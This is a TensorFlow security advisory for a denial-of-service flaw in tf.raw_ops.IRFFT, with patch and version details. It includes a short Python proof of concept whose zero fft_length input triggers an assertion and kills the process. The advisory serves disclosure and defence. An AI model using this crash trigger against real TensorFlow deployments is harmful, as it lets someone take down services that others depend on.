summary: "CHECK-fail in `tf.raw_ops.IRFFT`\n### Impact\nAn attacker can cause a denial of service\
  \ by exploiting a `CHECK`-failure coming from the implementation of `tf.raw_ops.IRFFT`:\n\
  \    \n```python\nimport tensorflow as tf\n\nvalues = [-10.0] * 130\nvalues[0] = -9.999999999999995\n\
  inputs = tf.constant(values, shape=[10, 13], dtype=tf.float32)\ninputs = tf.cast(inputs, dtype=tf.complex64)\n\
  fft_length = tf.constant([0], shape=[1], dtype=tf.int32)\n\ntf.raw_ops.IRFFT(input=inputs,\
  \ fft_length=fft_length)\n``` \n    \nThe above example causes Eigen code to operate on an\
  \ empty matrix. This triggers on an assertion and causes program termination.\n\n### Patches\n\
  We have patched the issue in GitHub commit [1c56f53be0b722ca657cbc7df461ed676c8642a2](https://github.com/tensorflow/tensorflow/commit/1c56f53be0b722ca657cbc7df461ed676c8642a2).\n\
  \  \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on\
  \ TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are\
  \ also affected and still in supported range.\n\n### For more information \nPlease consult\
  \ [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for\
  \ more information regarding the security model and how to contact us with issues and questions.\n\
  \n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu\
  \ X-Team."
